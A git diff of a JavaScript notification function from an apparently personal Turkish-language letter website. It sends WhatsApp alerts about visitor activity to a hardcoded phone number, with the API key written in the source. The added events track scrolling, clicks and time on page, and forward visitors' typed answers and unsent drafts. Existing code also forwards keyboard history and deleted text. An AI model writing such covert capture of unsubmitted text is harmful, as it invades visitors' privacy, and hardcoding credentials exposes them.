@@ -123,46 +123,94 @@ async function sendWhatsAppNotification(eventType, data = {}) {
     const PHONE = '+905418445100';
     const API_KEY = '5815335';
 
-    // Filter out minor events so WhatsApp is not spammed with every scroll step
+    // Ignore developer device IDs (Zero notifications for dev_m2troqnl9_mswunr9c)
+    const IGNORED_DEVICE_IDS = ['dev_m2troqnl9_mswunr9c'];
+    const devId = String(data.deviceId || '').trim();
+    if (devId && IGNORED_DEVICE_IDS.includes(devId)) return;
+
     let msg = '';
 
-    if (eventType === 'last_note_locked') {
-      msg = `🔒 *Neyse Mektubu Mühürlendi!*\n\n` +
+    if (eventType === 'last_scroll_started') {
+      msg = `📜 *Ziyaretçi /last Sayfasını Kaydırmaya Başladı!*\n\n` +
+            `👉 *Eylem:* Cümleler & Geri Sayım Ekranı Kaydırılıyor\n` +
+            `📱 *Cihaz:* ${data.device || '-'}`;
+    } else if (eventType === 'last_lock_clicked') {
+      msg = `🔒 *Mektubu Sakla Butonuna Basıldı!*\n\n` +
+            `👉 Ziyaretçi mektup saklama formunu açtı.\n` +
+            `⏱️ *Sayfaya Geldikten:* ${data.buttonClickTime || '-'}\n` +
+            `📱 *Cihaz:* ${data.device || '-'}`;
+    } else if (eventType === 'last_note_locked') {
+      msg = `🔒 *Mühürlü Not & Mektup Oluşturuldu!*\n\n` +
             `📝 *Yazılan Not:* "${data.noteText || data.note || '-'}"\n` +
             `⌨️ *Klavye Geçmişi:* "${data.allTypedHistory || '-'}"\n` +
             `✂️ *Silinen Parçalar:* "${data.deletedText || '-'}"\n` +
             `📅 *Açılacağı Tarih:* ${data.targetDate || '-'}\n` +
             `🔑 *Kilit Kodu:* ${data.sha256Code || '-'}\n` +
-            `📱 *Cihaz:* ${data.device || '-'}\n` +
-            `⏱️ *Tıklama Süresi:* ${data.buttonClickTime || '-'}`;
-    } else if (eventType === 'last_letter_burned') {
-      msg = `🔥 *Neyse Mektubu YAKILDI!*\n\n` +
-            `⚠️ *Durum:* Ziyaretçi mektubu yakmayı kabul etti.\n` +
-            `📱 *Cihaz:* ${data.device || '-'}\n` +
-            `⏱️ *Tıklama Süresi:* ${data.buttonClickTime || '-'}`;
-    } else if (eventType === 'last_burn_modal_choice') {
-      msg = `🔥 *Mektup Yakma Kararı Yapıldı*\n\n` +
-            `👉 *Karar:* ${data.choice || '-'}\n` +
+            `⏱️ *Butona Basılma Süresi:* ${data.buttonClickTime || '-'}\n` +
             `📱 *Cihaz:* ${data.device || '-'}`;
     } else if (eventType === 'last_burn_modal_opened') {
-      msg = `🔥 *Mektup Yakma Butonuna Basıldı*\n\n` +
-            `👉 Ziyaretçi "Mektubu Yak" butonuna bastı.\n` +
+      msg = `🔥 *Mektubu Yak Butonuna Basıldı!*\n\n` +
+            `👉 Ziyaretçi mektup yakma onay penceresini açtı.\n` +
+            `⏱️ *Sayfaya Geldikten:* ${data.buttonClickTime || '-'}\n` +
             `📱 *Cihaz:* ${data.device || '-'}`;
-    } else if (eventType === 'last_lock_clicked') {
-      msg = `🔒 *Mektubu Sakla Butonuna Basıldı*\n\n` +
-            `👉 Ziyaretçi mektup saklama formunu açtı.\n` +
+    } else if (eventType === 'last_burn_modal_choice') {
+      const isProceed = data.choice && (data.choice.includes('Devam') || data.choice.includes('Kabul') || data.choice.includes('Evet'));
+      msg = `${isProceed ? '🔥' : '🛡️'} *Mektup Yakma Kararı: ${data.choice || '-'}*\n\n` +
+            `👉 Ziyaretçi yakma penceresinde kararını verdi: ${data.choice || '-'}\n` +
             `📱 *Cihaz:* ${data.device || '-'}`;
-    } else if (eventType === 'letter_submitted') {
-      msg = `✉️ *Yeni Mektup / Not Gönderildi!*\n\n` +
-            `📝 *Metin:* "${data.text || data.letterText || '-'}"\n` +
-            `👤 *Gönderen:* ${data.author || 'Anonim'}\n` +
+    } else if (eventType === 'last_letter_burned') {
+      msg = `🔥 *Neyse Mektubu YAKILDI ve 10 Dk Sayaç Başlatıldı!*\n\n` +
+            `⚠️ *Durum:* Ziyaretçi mektubu yakmayı onayladı.\n` +
+            `⏱️ *Butona Basılma Süresi:* ${data.buttonClickTime || '-'}\n` +
+            `📱 *Cihaz:* ${data.device || '-'}`;
+    } else if (eventType === 'last_letter_zoom_toggled') {
+      msg = `🔍 *3D Mektuba Tıklandı (Zoom)*\n\n` +
+            `👉 Ziyaretçi ortadaki 3D mektuba tıklayarak büyüttü/küçülttü.\n` +
+            `📱 *Cihaz:* ${data.device || '-'}`;
+    } else if (eventType === 'last_letter_fully_unfolded') {
+      msg = `📜 *3D Mektup Tamamen Katından Çıkarıldı ve Okunuyor*\n\n` +
+            `👉 Ziyaretçi mektubu tam ekranda açtı.\n` +
+            `📱 *Cihaz:* ${data.device || '-'}`;
+    } else if (eventType === 'last_page_abandoned') {
+      msg = `🚪 *Ziyaretçi /last Sayfasından Ayrıldı / Sekmeyi Kapattı*\n\n` +
+            `⏱️ *Sitede Kalınan Süre:* ${data.duration || '-'}\n` +
+            `📍 *Ayrıldığı Aşama:* ${data.stage || '-'}\n` +
+            `📱 *Cihaz:* ${data.device || '-'}`;
+    } else if (eventType === 'first_scroll_started') {
+      msg = `📜 *Ziyaretçi Ana Sayfayı Kaydırmaya Başladı*\n\n` +
+            `📱 *Cihaz:* ${data.device || '-'}`;
+    } else if (eventType === 'food_input_typed') {
+      msg = `💬 *Yemek Kutusuna Cevap Yazıldı*\n\n` +
+            `📝 *Yazılan Cevap:* "${data.input || data.answer || '-'}"\n` +
             `📱 *Cihaz:* ${data.device || '-'}`;
     } else if (eventType === 'sut_corbasi_unlocked') {
       msg = `🍲 *Süt Çorbası Şifresi Çözüldü!*\n\n` +
-            `🎉 Ziyaretçi "Süt Çorbası" yazarak Ayşenur mektubunun kilidini açtı!\n` +
+            `🎉 "Süt Çorbası" yazarak Ayşenur mektubunun kilidi açıldı!\n` +
+            `📱 *Cihaz:* ${data.device || '-'}`;
+    } else if (eventType === 'aysenur_letter_reached') {
+      msg = `🌹 *Ayşenur Mektubu Ekranına Ulaşıldı*\n\n` +
+            `📱 *Cihaz:* ${data.device || '-'}`;
+    } else if (eventType === 'page_bottom_reached') {
+      msg = `🏔️ *Sayfanın En Altına Ulaşıldı*\n\n` +
+            `📱 *Cihaz:* ${data.device || '-'}`;
+    } else if (eventType === 'visitor_left_page') {
+      msg = `🚪 *Ziyaretçi Ana Sayfadan Ayrıldı / Sekmeyi Kapattı*\n\n` +
+            `⏱️ *Sitede Kalınan Süre:* ${data.duration || '-'}\n` +
+            `📍 *Ayrıldığı Aşama:* ${data.stage || '-'}\n` +
+            `📱 *Cihaz:* ${data.device || '-'}`;
+    } else if (eventType === 'letter_submitted') {
+      msg = `✉️ *Yeni Mektup Gönderildi!*\n\n` +
+            `📝 *Mektup:* "${data.text || data.letterText || '-'}"\n` +
+            `👤 *Gönderen:* ${data.author || 'Anonim'}\n` +
+            `📱 *Cihaz:* ${data.device || '-'}`;
+    } else if (eventType === 'letter_draft_abandoned') {
+      msg = `✏️ *Mektup Yazılırken Sekme Kapandı*\n\n` +
+            `📝 *Kalan Taslak:* "${data.draft || data.text || '-'}"\n` +
             `📱 *Cihaz:* ${data.device || '-'}`;
     } else {
-      return; // Skip minor events
+      msg = `📢 *Etkinlik:* ${eventType}\n\n` +
+            `👉 *Eylem:* ${data.action || data.stage || '-'}\n` +
+            `📱 *Cihaz:* ${data.device || '-'}`;
     }
 
     const encodedText = encodeURIComponent(msg);
